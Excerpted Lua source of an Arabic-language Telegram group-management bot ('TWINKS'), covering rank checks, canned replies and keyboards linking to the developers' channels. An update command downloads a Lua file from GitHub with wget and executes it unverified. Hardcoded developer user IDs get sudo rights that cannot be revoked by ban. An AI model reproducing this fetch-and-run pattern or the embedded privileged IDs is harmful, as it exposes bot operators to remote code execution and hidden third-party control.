...
if res ~= 200 then
print('\27[0;31m⩹━━━━━━ 𝚃𝚆𝙸𝙽𝙺𝚂 ━━━━━━⩺\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na≪⩹━━━━━━ 𝚃𝚆𝙸𝙽𝙺𝚂 ━━━━━━⩺≫\n27[0;39;49m')
database:set(id_server..":token",token)
end 
else
print('\27[0;35m⩹━━━━━━ 𝚃𝚆𝙸𝙽𝙺𝚂 ━━━━━━⩺ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
> CH › @SUSPICIOUS_PAST
~> DEVELOPER › @NA_RU_TO_17 
~> DEVELOPER › @HG_XD2
~> DEVELOPER › @Zbboooooooo
]])
...
sudo_users = {SUDO,1678873493,1786048631,922512089}   
...
if tonumber(user_id) == tonumber(1678873493) then  
var = true 
elseif tonumber(user_id) == tonumber(1786048631) then
var = true  
elseif tonumber(user_id) == tonumber(922512089) then
var = true  
...
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = database:get(bot_id.."CoSu:Rd"..msg.chat_id_) or 'تـويـنكـز'
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼 𝒔𝒐𝒖𝒓𝒄𝒆 𝚃𝚆𝙸𝙽𝙺𝚂")  
...
os.execute('wget https://raw.githubusercontent.com/exNaruto200/EX/main/DRAGON.lua')
send(msg.chat_id_, msg.id_,' ☁️ تم تحديث السور س \n ☁️ لديك اخر اصدار لسورس تـويـنكـز \n ☁️ الاصدار☁️ { v 7.0}')
dofile('DRAGON.lua')  
end
if text == 'الاصدار' and DevSoFi(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ☁️ اصدار سورس تـويـنكـز\n ☁️ الاصدار☁️{ v 7.0}')
end
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/SUSPICIOUS_PAST)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس️️', url="t.me/SUSPICIOUS_PAST"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[TWL](t.me/HG_XD2200BOT)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '⌯｟TＷＡＳＯＬ｠⌯', url="t.me/HG_XD2200BOT"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
send(msg.chat_id_,0," ☁️ العضو : {["..data.first_name_.."](t.me/SUSPICIOUS_PAST)}\n ☁️ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ☁️ عذرا ☁️ {["..data.first_name_.."](t.me/SUSPICIOUS_PAST)}\n ☁️ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
local Text = [[
🧚‍♀️W𝒆𝒍𝒄𝒐𝒎𝒆 𝒕𝒐 𝒕𝒉𝒆 𝚃𝚆𝙸𝙽𝙺𝚂🧚‍♀️
🧚‍♀️مرحب بيك في سورس تـويـنكـز الاعظم🧚‍♀️
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' ☁️  𝑵𝑨𝑹𝑼𝑻𝑶  ☁️ ',url="t.me/NA_RU_TO_17"}},
{{text = '☁️  𝑺𝑬𝑰𝑲𝑶  ☁️',url="t.me/HG_XD2"}},
{{text = '☁️  𝑺𝑻𝑬𝑳𝑳𝑨  ☁️', url="t.me/Zbboooooooo"}},
{{text = '☁️ 𝑺𝑶𝑼𝑹𝑪𝑬 𝚃𝚆𝙸𝙽𝙺𝚂  ☁️', url="t.me/SUSPICIOUS_PAST"}},
{{text = '☁️ 𝑻𝑶 𝑨𝑺𝑲  ☁️',url="t.me/HG_XD2200BOT"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
if text == 'ناروتو' or text == 'Naruto' or text == 'Naruto' then
local Text = [[
المبرمج ناروتو لو حابب تتواصل معاه
اتبع الزر إلى تحت ⬇️
...
if text == 'سايكو' or text == 'SEIKO' or text == 'SEIKO' then
local Text = [[
المبرمج سايكو 
اتبع الزر إلى تحت ⬇️
...
" لو حبيبه قالتلك بيو بيو هتوافق  ?🥵",
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '☁️ SＯＵＲＣＥ ☁️', url="t.me/SUSPICIOUS_PAST"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if text == 'العاب تـويـنكـز' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
اهلا في قائمه الالعاب المتطوره سورس تـويـنكـز 
...
if tonumber(result.sender_user_id_) == tonumber(1678873493) then  
send(msg.chat_id_, msg.id_, " ☁️ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1786048631) then  
send(msg.chat_id_, msg.id_, " ☁️ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(922512089) then  
send(msg.chat_id_, msg.id_, " ☁️ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if result.id_ == tonumber(1678873493) then
send(msg.chat_id_, msg.id_, " ☁️ لا يمكنك حظر مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1786048631) then
send(msg.chat_id_, msg.id_, " ☁️ لا يمكنك حظر مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(922512089) then
send(msg.chat_id_, msg.id_, " ☁️ لا يمكنك حظر مبرمج السورس \n")
return false 
end
...
if tonumber(userid) == tonumber(1678873493) then  
send(msg.chat_id_, msg.id_, " ☁️ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber(922512089) then  
send(msg.chat_id_, msg.id_, " ☁️ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber(1786048631) then  
send(msg.chat_id_, msg.id_, " ☁️ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if Get_info then
local TextS = "\n ☁️ اهلا بك في متجر ملفات تـويـنكـز\n ☁️ ملفات السورس ↓\n⩹━━━━━━ 𝚃𝚆𝙸𝙽𝙺𝚂 ━━━━━━⩺\n\n"
local TextE = "\n⩹━━━━━━ 𝚃𝚆𝙸𝙽𝙺𝚂 ━━━━━━⩺\n ☁️ علامة تعني { ✔️ } ملف مفعل\n ☁️ علامة تعني { ✖ } ملف معطل\n ☁️ قناة سورس تـويـنكـز↓\n".." ☁️ [اضغط هنا لدخول](t.me/SUSPICIOUS_PAST) \n"
local NumFile = 0
...
send(msg.chat_id_, msg.id_," ☁️ عذرا الملف لايدعم سورس تـويـنكـز\n") 
end
return false
end
...
if text == ("مسح قائمه تـويـنكـز") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ☁️ تم مسح قائمه تـويـنكـز')
return false
end

if text == 'قائمه تـويـنكـز' and Sudo(msg) then
...
if #list == 0 then
t = " ☁️ لا يوجد احد في قائمه تـويـنكـز"
end
send(msg.chat_id_, msg.id_, t)
return false
end
...
if text == ("رفع تـويـنكـز") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع تـويـنكـز @(.*)$") and Sudo(msg) then
local username = text:match("^رفع تـويـنكـز @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع تـويـنكـز (%d+)$") and Sudo(msg) then
local userid = text:match("^رفع تـويـنكـز (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل تـويـنكـز") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل تـويـنكـز @(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل تـويـنكـز @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل تـويـنكـز (%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل تـويـنكـز (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
' }\n'..' ☁️  الرفع ☁️ { '..setadd..
' }\n'..' ☁️  الحظر ☁️ { '..banm..' }\n\n⩹━━━━━━ 𝚃𝚆𝙸𝙽𝙺𝚂 ━━━━━━⩺\n ☁️ قناة سورس تـويـنكـز ↓\n [ 𝒔𝒐𝒖𝒓𝒄𝒆 𝚃𝚆𝙸𝙽𝙺𝚂](t.me/SUSPICIOUS_PAST) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'تـويـنكـز').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'تـويـنكـز')
local DRAGON_Msg = {
'ننعم يروحي 😻💙',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐀𝐍𝐆𝐄??𝐒.',url="t.me/SUSPICIOUS_PAST"}},
}
local msg_id = msg.id_/2097152/0.5
...
end --الكود حصري سورس تـويـنكـز يعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'تـويـنكـز').." غادر" or text == 'غادر' then  
...
send(msg.chat_id_,msg.id_, '[انت مطوري نور عنيا🥺🤍](t.me/SUSPICIOUS_PAST)') 
return false
end

if text == 'انا مين' and DevSoFi(msg) then 
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/SUSPICIOUS_PAST)') 
return false
end

if text == 'انا مين' and Sudo(msg) then 
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/SUSPICIOUS_PAST)') 
return false
end

if text == 'انا مين' and CoSu(msg) then 
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/SUSPICIOUS_PAST)') 
return false
end

if text == 'انا مين' and Constructor(msg) then 
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/SUSPICIOUS_PAST)') 
return false
end

if text == 'انا مين' and BasicConstructor(msg) then 
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/SUSPICIOUS_PAST)') 
return false
end

if text == 'انا مين' and Manager(msg) then 
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/SUSPICIOUS_PAST)') 
return false
end

if text == 'انا مين' and Mod(msg) then 
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/SUSPICIOUS_PAST)') 
return false
end

if text == 'انا مين' and Special(msg) then 
send(msg.chat_id_,msg.id_, '[ انت مميز ابن ناس 😊 ](t.me/SUSPICIOUS_PAST)') 
return false
end

if text == 'انا مين' then
send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/SUSPICIOUS_PAST)') 
return false
end
...
if text == 'سلام' then 
send(msg.chat_id_,msg.id_, '[ابق تعاله كليوم..😹💔🎶](t.me/SUSPICIOUS_PAST)') 
return false
end

if text == 'هاي' or text == 'هيي' then
send(msg.chat_id_,msg.id_, '[علي الواي فاي..😺💜](t.me/SUSPICIOUS_PAST)') 
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/SUSPICIOUS_PAST)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/SUSPICIOUS_PAST)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[نزل عينك عيب كده..🌚♥️](t.me/SUSPICIOUS_PAST)') 
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[يحلات عيونك..♥️🦋](t.me/SUSPICIOUS_PAST)')
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عايز من ده..💋🥀](t.me/SUSPICIOUS_PAST)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[يولا يا وسخ 🥵](t.me/SUSPICIOUS_PAST)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[الحمد لله يقلبي ❤️](t.me/SUSPICIOUS_PAST)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[اوماااااال يا جدع 😹❤️](t.me/SUSPICIOUS_PAST)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[تيب تيب يعسل 😁](t.me/SUSPICIOUS_PAST)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[بلاش نكد بحبك 😁 ](t.me/SUSPICIOUS_PAST)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[يستر عايز اي 🤭](t.me/SUSPICIOUS_PAST)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بف..🙄💔](t.me/SUSPICIOUS_PAST)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[متزعلش بحبك..😥♥️](t.me/SUSPICIOUS_PAST)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وانا كمان بحبك .🥺❤️](t.me/SUSPICIOUS_PAST)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بيف ..🙄💔](t.me/SUSPICIOUS_PAST)')
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وعليكم السلام ..🖤🌚](t.me/SUSPICIOUS_PAST)') 
return false
end
end
end
...
اتبع الازرار تحت ⇣
واستمتع للأوامر 🕹️
[☁️ 𝒔𝒐𝒖𝒓𝒄𝒆 𝚃𝚆𝙸𝙽𝙺𝚂 ☁️](t.me/SUSPICIOUS_PAST)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
...
{
{text = ' 𝒔𝒐𝒖𝒓𝒄𝒆 𝚃𝚆𝙸𝙽𝙺𝚂', url="t.me/SUSPICIOUS_PAST"},
...
local Teext =[[
اتبع الازرار تحت 
واستمتع للأوامر سورس تـويـنكـز 🕹️
[☁️ 𝒔𝒐𝒖𝒓𝒄𝒆 𝚃𝚆𝙸𝙽𝙺𝚂 ☁️](t.me/SUSPICIOUS_PAST)
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
{
{text = '??𝒐𝒖𝒓𝒄𝒆 𝚃𝚆𝙸𝙽𝙺𝚂', url="t.me/SUSPICIOUS_PAST"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'تـويـنكـز')
